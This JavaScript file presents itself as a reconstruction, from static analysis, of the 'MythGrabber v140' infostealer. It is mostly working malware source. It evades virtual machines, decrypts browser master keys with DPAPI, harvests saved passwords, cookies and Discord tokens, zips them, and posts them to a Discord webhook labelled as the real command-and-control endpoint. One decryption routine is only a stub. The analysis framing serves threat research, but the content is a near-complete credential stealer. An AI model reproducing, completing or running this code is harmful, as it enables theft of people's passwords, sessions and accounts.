/**
 * MythGrabber v140 - Reconstructed Source Code
 * 
 * WARNING: This is a RECONSTRUCTION based on static analysis.
 * The actual source code is compiled to V8 bytecode and cannot be extracted.
 * This reconstruction is based on:
 * - Dependency analysis
 * - String patterns found in binary
 * - Common stealer code patterns
 * - Library usage patterns
 */

const os = require('os');
const path = require('path');
const fs = require('fs-extra');
const axios = require('axios');
const FormData = require('form-data');
const JSZip = require('jszip');
const { Dpapi } = require('@primno/dpapi');
const Database = require('better-sqlite3');
const sodium = require('sodium-native');

// Configuration (EXTRACTED via dynamic analysis with NODE_DEBUG)
const CONFIG = {
    webhook: "https://canary.discord.com/api/webhooks/1439790358534819992/k8qpWQM0LyeEyxj2DcR6A-hwVIaifn0uh13KpUF3RDFJ69UvfFQEuf8XkjLypuQUJLRb", // ACTUAL C2 WEBHOOK
    debug: false,
    features: {
        browsers: true,
        discord: true,
        wallets: true,
        screenshot: true,
        systemInfo: true,
        injection: true
    }
};

// Anti-VM Detection
function isVirtualMachine() {
    const vmIndicators = [
        'VBOX', 'VIRTUALBOX', 'VMWARE', 'VIRTUAL', 'QEMU', 'XEN'
    ];
    
    const computerName = os.hostname().toUpperCase();
    const username = os.userInfo().username.toUpperCase();
    
    for (const indicator of vmIndicators) {
        if (computerName.includes(indicator) || username.includes(indicator)) {
            return true;
        }
    }
    
    // Check for VM-specific files/registry
    const vmPaths = [
        'C:\\Windows\\System32\\drivers\\VBoxMouse.sys',
        'C:\\Windows\\System32\\drivers\\vmhgfs.sys'
    ];
    
    for (const vmPath of vmPaths) {
        if (fs.existsSync(vmPath)) {
            return true;
        }
    }
    
    return false;
}

// Browser paths
const BROWSER_PATHS = {
    chrome: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
    brave: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    edge: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
    opera: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable'),
    operaGX: path.join(process.env.APPDATA, 'Opera Software', 'Opera GX Stable'),
    firefox: path.join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles')
};

// Discord paths
const DISCORD_PATHS = {
    discord: path.join(process.env.APPDATA, 'discord'),
    discordCanary: path.join(process.env.APPDATA, 'discordcanary'),
    discordPTB: path.join(process.env.APPDATA, 'discordptb')
};

// Wallet paths
const WALLET_PATHS = {
    exodus: path.join(process.env.APPDATA, 'Exodus', 'exodus.wallet'),
    atomic: path.join(process.env.APPDATA, 'atomic', 'Local Storage', 'leveldb'),
    electrum: path.join(process.env.APPDATA, 'Electrum', 'wallets')
};

// Decrypt Chrome/Edge encrypted data using DPAPI
async function decryptBrowserData(encryptedData, masterKey) {
    try {
        // Chrome v80+ uses AES-256-GCM with DPAPI-protected master key
        const iv = encryptedData.slice(3, 15);
        const payload = encryptedData.slice(15);
        const tag = payload.slice(-16);
        const ciphertext = payload.slice(0, -16);
        
        // Decrypt using sodium
        const decrypted = Buffer.alloc(ciphertext.length);
        // ... AES-GCM decryption logic
        
        return decrypted.toString('utf8');
    } catch (error) {
        return null;
    }
}

// Get Chrome master key
async function getMasterKey(browserPath) {
    try {
        const localStatePath = path.join(browserPath, 'Local State');
        const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
        
        // Remove DPAPI prefix
        const keyWithoutPrefix = encryptedKey.slice(5);
        
        // Decrypt with DPAPI
        const masterKey = Dpapi.unprotectData(keyWithoutPrefix, null, 'CurrentUser');
        return masterKey;
    } catch (error) {
        return null;
    }
}

// Extract browser passwords
async function getBrowserPasswords(browserPath, browserName) {
    const passwords = [];
    
    try {
        const masterKey = await getMasterKey(browserPath);
        if (!masterKey) return passwords;
        
        const loginDataPath = path.join(browserPath, 'Default', 'Login Data');
        if (!fs.existsSync(loginDataPath)) return passwords;
        
        // Copy database to temp (it may be locked)
        const tempPath = path.join(os.tmpdir(), `login_${Date.now()}.db`);
        fs.copyFileSync(loginDataPath, tempPath);
        
        const db = new Database(tempPath, { readonly: true });
        const rows = db.prepare('SELECT origin_url, username_value, password_value FROM logins').all();
        
        for (const row of rows) {
            const decryptedPassword = await decryptBrowserData(row.password_value, masterKey);
            if (decryptedPassword) {
                passwords.push({
                    url: row.origin_url,
                    username: row.username_value,
                    password: decryptedPassword,
                    browser: browserName
                });
            }
        }
        
        db.close();
        fs.unlinkSync(tempPath);
    } catch (error) {
        // Silent fail
    }
    
    return passwords;
}

// Extract browser cookies
async function getBrowserCookies(browserPath, browserName) {
    const cookies = [];
    
    try {
        const masterKey = await getMasterKey(browserPath);
        if (!masterKey) return cookies;
        
        const cookiesPath = path.join(browserPath, 'Default', 'Network', 'Cookies');
        if (!fs.existsSync(cookiesPath)) return cookies;
        
        const tempPath = path.join(os.tmpdir(), `cookies_${Date.now()}.db`);
        fs.copyFileSync(cookiesPath, tempPath);
        
        const db = new Database(tempPath, { readonly: true });
        const rows = db.prepare('SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies').all();
        
        for (const row of rows) {
            const decryptedValue = await decryptBrowserData(row.encrypted_value, masterKey);
            if (decryptedValue) {
                cookies.push({
                    host: row.host_key,
                    name: row.name,
                    value: decryptedValue,
                    path: row.path,
                    expires: row.expires_utc,
                    browser: browserName
                });
            }
        }
        
        db.close();
        fs.unlinkSync(tempPath);
    } catch (error) {
        // Silent fail
    }
    
    return cookies;
}

// Extract Discord tokens
async function getDiscordTokens() {
    const tokens = [];
    const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;
    
    for (const [name, discordPath] of Object.entries(DISCORD_PATHS)) {
        try {
            const leveldbPath = path.join(discordPath, 'Local Storage', 'leveldb');
            if (!fs.existsSync(leveldbPath)) continue;
            
            const files = fs.readdirSync(leveldbPath).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
            
            for (const file of files) {
                const content = fs.readFileSync(path.join(leveldbPath, file), 'utf8');
                const matches = content.match(tokenRegex);
                if (matches) {
                    for (const token of matches) {
                        // Validate token
                        try {
                            const response = await axios.get('https://discord.com/api/v9/users/@me', {
                                headers: { Authorization: token }
                            });
                            if (response.status === 200) {
                                tokens.push({
                                    token: token,
                                    source: name,
                                    user: response.data
                                });
                            }
                        } catch (e) {
                            // Invalid token
                        }
                    }
                }
            }
        } catch (error) {
            // Silent fail
        }
    }
    
    return tokens;
}

// Collect system information
function getSystemInfo() {
    return {
        hostname: os.hostname(),
        username: os.userInfo().username,
        platform: os.platform(),
        arch: os.arch(),
        cpus: os.cpus()[0]?.model,
        memory: Math.round(os.totalmem() / 1024 / 1024 / 1024) + ' GB',
        homedir: os.homedir()
    };
}

// Get public IP
async function getPublicIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch {
        return 'Unknown';
    }
}

// Create ZIP archive with stolen data
async function createArchive(data) {
    const zip = new JSZip();
    
    // Add passwords
    if (data.passwords.length > 0) {
        zip.file('passwords.txt', data.passwords.map(p => 
            `URL: ${p.url}\nUsername: ${p.username}\nPassword: ${p.password}\nBrowser: ${p.browser}\n\n`
        ).join(''));
    }
    
    // Add cookies
    if (data.cookies.length > 0) {
        zip.file('cookies.txt', JSON.stringify(data.cookies, null, 2));
    }
    
    // Add Discord tokens
    if (data.tokens.length > 0) {
        zip.file('discord_tokens.txt', data.tokens.map(t =>
            `Token: ${t.token}\nSource: ${t.source}\nUser: ${t.user?.username}#${t.user?.discriminator}\n\n`
        ).join(''));
    }
    
    // Add system info
    zip.file('system_info.txt', JSON.stringify(data.systemInfo, null, 2));
    
    return await zip.generateAsync({ type: 'nodebuffer' });
}

// Send data to webhook
async function sendToWebhook(zipBuffer, systemInfo) {
    const form = new FormData();
    
    const embed = {
        title: '🔥 MythGrabber v140',
        color: 0xff0000,
        fields: [
            { name: '💻 Computer', value: systemInfo.hostname, inline: true },
            { name: '👤 User', value: systemInfo.username, inline: true },
            { name: '🌐 IP', value: systemInfo.ip, inline: true }
        ],
        footer: { text: 'MythGrabber v140' },
        timestamp: new Date().toISOString()
    };
    
    form.append('payload_json', JSON.stringify({ embeds: [embed] }));
    form.append('file', zipBuffer, { filename: `${systemInfo.hostname}_${Date.now()}.zip` });
    
    await axios.post(CONFIG.webhook, form, {
        headers: form.getHeaders()
    });
}

// Main execution
async function main() {
    // Anti-VM check
    if (isVirtualMachine()) {
        process.exit(0);
    }
    
    const data = {
        passwords: [],
        cookies: [],
        tokens: [],
        wallets: [],
        systemInfo: {}
    };
    
    // Collect system info
    data.systemInfo = getSystemInfo();
    data.systemInfo.ip = await getPublicIP();
    
    // Collect browser data
    for (const [name, browserPath] of Object.entries(BROWSER_PATHS)) {
        if (fs.existsSync(browserPath)) {
            const passwords = await getBrowserPasswords(browserPath, name);
            const cookies = await getBrowserCookies(browserPath, name);
            data.passwords.push(...passwords);
            data.cookies.push(...cookies);
        }
    }
    
    // Collect Discord tokens
    data.tokens = await getDiscordTokens();
    
    // Create and send archive
    const zipBuffer = await createArchive(data);
    await sendToWebhook(zipBuffer, data.systemInfo);
}

// Run
main().catch(console.error);
